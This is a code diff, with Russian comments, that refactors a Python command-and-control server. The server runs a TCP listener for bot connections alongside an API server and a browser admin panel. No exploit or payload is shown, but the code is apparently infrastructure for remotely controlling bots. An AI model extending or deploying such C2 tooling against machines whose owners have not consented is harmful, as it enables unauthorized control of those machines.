@@ -2,33 +2,34 @@
 
 import asyncio
 import webbrowser
-from typing import List, NoReturn, Optional
+from typing import List, Optional
 
 from backend.Config import STORAGE_DIR, IP, PORT, API_PORT
 import backend.LoggerWrapper as logger
+from backend import start_benchmark
+from backend.API.api import run_fastapi_server
+from backend.Core.ClientConnection import BotConnectionHandler
 
 logger.Log.setup(str(STORAGE_DIR / "server.log"))
 
-from backend import start_benchmark
-from ..API.api import run_fastapi_server
-from .ClientConnection import BotConnectionHandler
 
-class C2Server:
+class CommandControlServer:
     """
-    Класс управления центральным сервером (Command and Control).
+    Класс управления центральным сервером управления (Command and Control).
+    Обеспечивает запуск TCP-слушателя для ботов и HTTP-сервера для API.
     """
 
     def __init__(self) -> None:
-        """Инициализация экземпляра сервера."""
-        self.server: Optional[asyncio.AbstractServer] = None
+        """Инициализация ресурсов экземпляра сервера."""
+        self.tcp_server: Optional[asyncio.AbstractServer] = None
 
-    async def start(self) -> None:
+    async def start_engine(self) -> None:
         """
-        Запускает TCP сервер, API сервер и систему мониторинга.
+        Запускает основной сетевой цикл, API сервер и браузерную панель управления.
         """
         connection_handler: BotConnectionHandler = BotConnectionHandler()
 
-        self.server = await asyncio.start_server(
+        self.tcp_server = await asyncio.start_server(
             connection_handler.handle_new_connection,
             IP,
             PORT,
@@ -37,32 +38,36 @@ class C2Server:
             limit=10 * 1024 * 1024
         )
 
-        logger.Log.info(f"[{self.__class__.__name__}] TCP Server started on {IP}:{PORT}")
+        logger.Log.info(f"[{self.__class__.__name__}] TCP Infrastructure started on {IP}:{PORT}")
 
-        api_tasks: List[asyncio.Task] = [
+        api_server_tasks: List[asyncio.Task] = [
             asyncio.create_task(run_fastapi_server(IP, API_PORT))
         ]
 
         start_benchmark(asyncio.get_running_loop())
 
-        admin_panel_url: str = f"http://127.0.0.1:{API_PORT}/"
-        logger.Log.info(f"[{self.__class__.__name__}] API Server launching at {admin_panel_url}")
+        administration_url: str = f"http://127.0.0.1:{API_PORT}/"
+        logger.Log.info(f"[{self.__class__.__name__}] API Infrastructure launching at {administration_url}")
 
         await asyncio.sleep(1)
-        webbrowser.open(admin_panel_url)
+        webbrowser.open(administration_url)
 
-        async with self.server:
+        async with self.tcp_server:
             try:
-                await asyncio.gather(self.server.serve_forever(), *api_tasks)
+                await asyncio.gather(self.tcp_server.serve_forever(), *api_server_tasks)
             except asyncio.CancelledError:
-                logger.Log.warning(f"[{self.__class__.__name__}] Shutdown initiated...")
+                logger.Log.warning(f"[{self.__class__.__name__}] Critical Shutdown initiated...")
             finally:
-                for task in api_tasks:
-                    task.cancel()
-                await asyncio.gather(*api_tasks, return_exceptions=True)
-                logger.Log.info(f"[{self.__class__.__name__}] Server stopped.")
+                for running_task in api_server_tasks:
+                    running_task.cancel()
+                
+                await asyncio.gather(*api_server_tasks, return_exceptions=True)
+                logger.Log.info(f"[{self.__class__.__name__}] All server components stopped.")
+
 
 async def start_server() -> None:
-    """Точка входа для запуска сервера."""
-    server_instance: C2Server = C2Server()
-    await server_instance.start()
+    """
+    Глобальная точка входа для инициализации и запуска сервера.
+    """
+    server_instance: CommandControlServer = CommandControlServer()
+    await server_instance.start_engine()
